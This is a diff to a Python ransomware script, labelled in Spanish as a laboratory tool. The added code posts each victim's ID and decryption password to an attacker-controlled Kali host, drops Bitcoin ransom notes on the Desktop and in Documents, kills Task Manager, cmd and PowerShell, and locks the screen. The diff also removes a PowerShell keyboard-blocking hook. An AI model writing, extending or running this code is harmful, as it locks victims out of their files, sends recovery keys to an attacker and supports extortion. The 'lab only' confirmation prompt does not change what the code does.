@@ -23,9 +23,11 @@ class RansomwareCompleto:
             'Windows.old', 'Recovery', '$Recycle.Bin'
         ]
         
+        # ⚡⚡⚡ IP DE KALI LINUX - CAMBIA SI ES NECESARIO ⚡⚡⚡
+        self.kali_ip = "10.0.2.20"  # IP de tu Kali Linux
         self.bitcoin = '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa'
         self.price = 500
-        self.url = 'http://localhost/victima.php'
+        self.url = f'http://{self.kali_ip}/victima.php'
         self.encryption_count = 0
         self.password = None
         self.victim_id = None
@@ -68,13 +70,73 @@ class RansomwareCompleto:
         self.password = ''.join(random.sample(s, 30))
         self.victim_id = ''.join(random.sample(string.ascii_lowercase + string.digits, 10))
 
+    def test_connection(self):
+        """Testea la conexión con el servidor Kali"""
+        print(f"🔗 Probando conexión con Kali Linux ({self.kali_ip})...")
+        try:
+            # Primero probar ping
+            result = os.system(f"ping -n 1 {self.kali_ip} >nul 2>nul")
+            if result == 0:
+                print("✅ Kali Linux responde al ping")
+            else:
+                print("❌ Kali Linux NO responde al ping")
+                return False
+            
+            # Probar el servidor web
+            response = requests.get(f'http://{self.kali_ip}/victima.php', timeout=5)
+            print(f"✅ Servidor web respondió: {response.status_code}")
+            return True
+            
+        except requests.exceptions.ConnectionError:
+            print(f"❌ No se puede conectar al servidor web en {self.kali_ip}")
+            print("   Verifica:")
+            print("   - Que Apache esté corriendo en Kali: sudo systemctl status apache2")
+            print("   - Que el archivo victima.php esté en /var/www/html/")
+            print("   - Que no haya firewall bloqueando")
+            return False
+        except Exception as e:
+            print(f"❌ Error de conexión: {e}")
+            return False
+
     def send_credentials(self):
+        """Envía credenciales al servidor Kali y las guarda en la base de datos"""
+        print(f"📤 Enviando credenciales a {self.url}...")
         try:
             values = {'pass': self.password, 'id': self.victim_id}
             response = requests.post(self.url, data=values, timeout=10)
-            return response.text.strip() == 'Ok.'
+            
+            if response.text.strip() == 'Ok.':
+                print("✅ Credenciales enviadas exitosamente a la base de datos")
+                print(f"   📝 ID: {self.victim_id}")
+                print(f"   🔐 Password: {self.password}")
+                return True
+            else:
+                print(f"⚠️ Respuesta inesperada del servidor: {response.text}")
+                self.save_credentials_local()
+                return False
+                
+        except requests.exceptions.ConnectionError:
+            print("❌ Error: No se pudo conectar al servidor Kali")
+            print("   Las credenciales se guardarán localmente")
+            self.save_credentials_local()
+            return False
+        except Exception as e:
+            print(f"❌ Error enviando credenciales: {e}")
+            self.save_credentials_local()
+            return False
+
+    def save_credentials_local(self):
+        """Guarda credenciales localmente si falla el envío"""
+        try:
+            with open('CREDENCIALES_LOCALES.txt', 'w') as f:
+                f.write(f"ID: {self.victim_id}\n")
+                f.write(f"PASSWORD: {self.password}\n")
+                f.write(f"BITCOIN: {self.bitcoin}\n")
+                f.write(f"PRICE: ${self.price}\n")
+                f.write(f"KALI_IP: {self.kali_ip}\n")
+            print("📄 Credenciales guardadas en CREDENCIALES_LOCALES.txt")
         except:
-            return True
+            pass
 
     def encrypt_file_windows(self, filepath):
         try:
@@ -109,19 +171,22 @@ class RansomwareCompleto:
 ║                    !!! SISTEMA BLOQUEADO !!!                 ║
 ╚══════════════════════════════════════════════════════════════╝
 
-TODOS SUS ARCHIVOS HAN SIDO CIFRADOS
+🔐 TODOS SUS ARCHIVOS HAN SIDO CIFRADOS 🔐
 
-• Para recuperar el acceso debe pagar ${self.price} en Bitcoin
+INFORMACIÓN PARA LA RECUPERACIÓN:
+• ID Único: {self.victim_id}
+• Pago Requerido: ${self.price} en Bitcoin
 • Dirección Bitcoin: {self.bitcoin}
-• Su ID único: {self.victim_id}
 
-NO CIERRE ESTA VENTANA - ES SU ÚNICA FORMA DE RECUPERAR EL SISTEMA
+⚠️  NO APAGUE LA COMPUTADORA ⚠️
+⚠️  NO REINSTALE EL SISTEMA ⚠️
 
-Escriba la clave de descifrado a continuación:
+Para recuperar sus archivos, ingrese la clave de descifrado a continuación:
 """
         
         locations = [
-            os.path.expanduser('~/Desktop/INSTRUCCIONES.txt'),
+            os.path.expanduser('~/Desktop/LEAME_URGENTE.txt'),
+            os.path.expanduser('~/Documents/INSTRUCCIONES.txt'),
             'C:/INSTRUCCIONES.txt'
         ]
         
@@ -129,6 +194,7 @@ Escriba la clave de descifrado a continuación:
             try:
                 with open(location, 'w', encoding='utf-8') as f:
                     f.write(note)
+                print(f"📄 Nota de rescate creada en: {location}")
             except:
                 pass
 
@@ -150,63 +216,6 @@ Escriba la clave de descifrado a continuación:
         """Deshabilita el administrador de tareas"""
         try:
             os.system('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f 2>nul')
-        except:
-            pass
-
-    def block_keyboard(self):
-        """Bloquea combinaciones de teclas importantes"""
-        try:
-            # Bloquear Win+R, Win+X, Ctrl+Shift+Esc, Alt+Tab, etc.
-            blocking_script = """
-Add-Type -TypeDefinition @"
-using System;
-using System.Runtime.InteropServices;
-public class KeyboardBlocker {
-    [DllImport("user32.dll")]
-    public static extern bool BlockInput(bool fBlockIt);
-    
-    [DllImport("user32.dll")]
-    public static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc callback, IntPtr hInstance, uint threadId);
-    
-    [DllImport("user32.dll")]
-    public static extern bool UnhookWindowsHookEx(IntPtr hInstance);
-    
-    [DllImport("user32.dll")]
-    public static extern IntPtr CallNextHookEx(IntPtr hInstance, int nCode, int wParam, IntPtr lParam);
-    
-    [DllImport("kernel32.dll")]
-    public static extern IntPtr GetModuleHandle(string lpModuleName);
-    
-    public delegate IntPtr LowLevelKeyboardProc(int nCode, int wParam, IntPtr lParam);
-    
-    public static IntPtr HookCallback(int nCode, int wParam, IntPtr lParam) {
-        if (nCode >= 0) {
-            return (IntPtr)1; // Bloquear todas las teclas
-        }
-        return CallNextHookEx(hHook, nCode, wParam, lParam);
-    }
-    
-    public static IntPtr hHook = IntPtr.Zero;
-    
-    public static void StartBlocking() {
-        hHook = SetWindowsHookEx(13, HookCallback, GetModuleHandle(null), 0);
-        BlockInput(true);
-    }
-    
-    public static void StopBlocking() {
-        BlockInput(false);
-        UnhookWindowsHookEx(hHook);
-    }
-}
-"@
-
-[KeyboardBlocker]::StartBlocking()
-"""
-            with open('C:\\Windows\\Temp\\block_keys.ps1', 'w') as f:
-                f.write(blocking_script)
-            
-            subprocess.Popen(['powershell', '-ExecutionPolicy', 'Bypass', '-File', 'C:\\Windows\\Temp\\block_keys.ps1'],
-                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except:
             pass
 
@@ -252,7 +261,7 @@ class FullScreenBlocker:
         # Mensaje
         message = tk.Label(
             main_frame,
-            text="FALTA REPARAR LA CONEXIÓN\\nTodos sus archivos han sido cifrados",
+            text="FALTA REPARAR LA CONEXIÓN\\\\nTodos sus archivos han sido cifrados",
             font=("Arial", 20),
             fg="white",
             bg="black"
@@ -315,8 +324,8 @@ class FullScreenBlocker:
         self.counter_label.pack(side="bottom", pady=10)
         
     def on_key_press(self, event):
-        # Permitir solo teclas alfanuméricas y algunas de control
-        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12"]:
+        # Bloquear teclas del sistema
+        if event.keysym in ["Escape", "Alt_L", "Alt_R", "F1", "F2", "F3", "F4", "F11", "F12", "Super_L", "Super_R"]:
             return "break"
             
     def on_click(self, event):
@@ -351,6 +360,8 @@ class FullScreenBlocker:
                 try:
                     # Cerrar administrador de tareas si se abre
                     os.system("taskkill /f /im taskmgr.exe 2>nul")
+                    os.system("taskkill /f /im cmd.exe 2>nul")
+                    os.system("taskkill /f /im powershell.exe 2>nul")
                     time.sleep(1)
                 except:
                     pass
@@ -391,7 +402,18 @@ VICTIM_ID = "{self.victim_id}"
 PASSWORD = "{self.password}"
 
 def main():
-    print("Descifrando archivos...")
+    print("Sistema de Recuperación de Archivos")
+    print("===================================")
+    print(f"ID de víctima: {{VICTIM_ID}}")
+    
+    input_password = input("Ingrese la clave de descifrado: ")
+    
+    if input_password != PASSWORD:
+        print("Clave incorrecta. Sistema permanece bloqueado.")
+        input("Presione Enter para salir...")
+        return
+        
+    print("Clave verificada. Descifrando archivos...")
     
     encrypted_files = []
     for root, dirs, files in os.walk(os.path.expanduser("~")):
@@ -399,15 +421,31 @@ def main():
             if file.endswith('.LOCKED'):
                 encrypted_files.append(os.path.join(root, file))
     
+    success_count = 0
     for enc_file in encrypted_files:
         try:
-            original_file = enc_file[:-7]
+            original_file = enc_file[:-7]  # Remover .LOCKED
             os.rename(enc_file, original_file)
-            print(f"Recuperado: {{os.path.basename(original_file)}}")
-        except:
-            pass
+            success_count += 1
+            print(f"✓ Recuperado: {{os.path.basename(original_file)}}")
+        except Exception as e:
+            print(f"✗ Error con {{os.path.basename(enc_file)}}: {{e}}")
             
-    print("¡Sistema recuperado!")
+    print(f"\\\\nProceso completado!")
+    print(f"Archivos recuperados: {{success_count}}/{{len(encrypted_files)}}")
+    
+    # Eliminar archivos temporales
+    try:
+        if os.path.exists("black_screen.py"):
+            os.remove("black_screen.py")
+        if os.path.exists("LEAME_URGENTE.txt"):
+            os.remove("LEAME_URGENTE.txt")
+        if os.path.exists("INSTRUCCIONES.txt"):
+            os.remove("INSTRUCCIONES.txt")
+    except:
+        pass
+        
+    print("\\\\n¡Sistema completamente recuperado!")
     input("Presione Enter para salir...")
 
 if __name__ == "__main__":
@@ -423,30 +461,47 @@ if __name__ == "__main__":
     def execute_complete_lockdown(self):
         """Ejecuta el bloqueo completo del sistema"""
         print("🔐 INICIANDO BLOQUEO COMPLETO DEL SISTEMA")
+        print("=" * 50)
         
-        # Generar claves
+        # Paso 1: Configurar conexión
+        print("\\\\n[1/5] 🔗 Configurando conexión con Kali Linux...")
+        if not self.test_connection():
+            print("¿Continuar sin conexión? (s/n)")
+            if input().lower() != 's':
+                print("Ejecución cancelada.")
+                return
+        
+        # Paso 2: Generar claves
+        print("\\\\n[2/5] 🔑 Generando claves de cifrado...")
         self.generate_keys()
-        print(f"Clave generada: {self.password}")
         
-        # Cifrar archivos
+        # Paso 3: Enviar credenciales
+        print("\\\\n[3/5] 📤 Enviando credenciales a la base de datos...")
+        self.send_credentials()
+        
+        # Paso 4: Cifrar archivos
+        print("\\\\n[4/5] 📁 Cifrando archivos...")
         directories = self.expand_paths()
+        total_encrypted = 0
         for directory in directories:
-            self.encrypt_directory(directory)
+            encrypted = self.encrypt_directory(directory)
+            total_encrypted += encrypted
+            print(f"   📂 {{directory}}: {{encrypted}} archivos")
         
-        # Crear archivos necesarios
+        # Paso 5: Bloquear sistema
+        print("\\\\n[5/5] 🚫 Activando bloqueo completo...")
         self.create_ransom_note()
         self.create_decryptor()
         self.create_black_screen()
         
-        # Bloquear sistema
-        print("🚫 BLOQUEANDO SISTEMA...")
         self.kill_system_tools()
         self.disable_task_manager()
-        self.block_keyboard()
-        
-        # Iniciar pantalla negra
-        print("🖥️ INICIANDO PANTALLA NEGRA...")
         self.start_black_screen()
+        
+        print("✅ SISTEMA BLOQUEADO EXITOSAMENTE")
+        print(f"📊 Total archivos cifrados: {{total_encrypted}}")
+        print(f"🔑 Clave de recuperación: {{self.password}}")
+        print("🖥️ Pantalla negra activada - Sistema completamente bloqueado")
         
         # Bloqueo continuo
         while True:
@@ -454,21 +509,20 @@ if __name__ == "__main__":
             time.sleep(2)
 
 if __name__ == "__main__":
-    # Verificar que es entorno controlado
-    print("⚠️  BLOQUEO COMPLETO DEL SISTEMA")
+    print("⚠️  BLOQUEO COMPLETO DEL SISTEMA - LABORATORIO")
     print("SOLO PARA ENTORNOS CONTROLADOS")
+    print("=" * 50)
     
     confirm = input("¿Continuar? (escribe 'BLOQUEAR'): ")
     if confirm != "BLOQUEAR":
-        print("Cancelado.")
+        print("Ejecución cancelada.")
         sys.exit()
         
-    # Ejecutar bloqueo
     ransomware = RansomwareCompleto()
     
     try:
         ransomware.execute_complete_lockdown()
     except KeyboardInterrupt:
-        print("Interrumpido por usuario")
+        print("\\\\n❌ Ejecución interrumpida por el usuario")
     except Exception as e:
-        print(f"Error: {e}")
+        print(f"\\\\n❌ Error durante la ejecución: {{e}}")
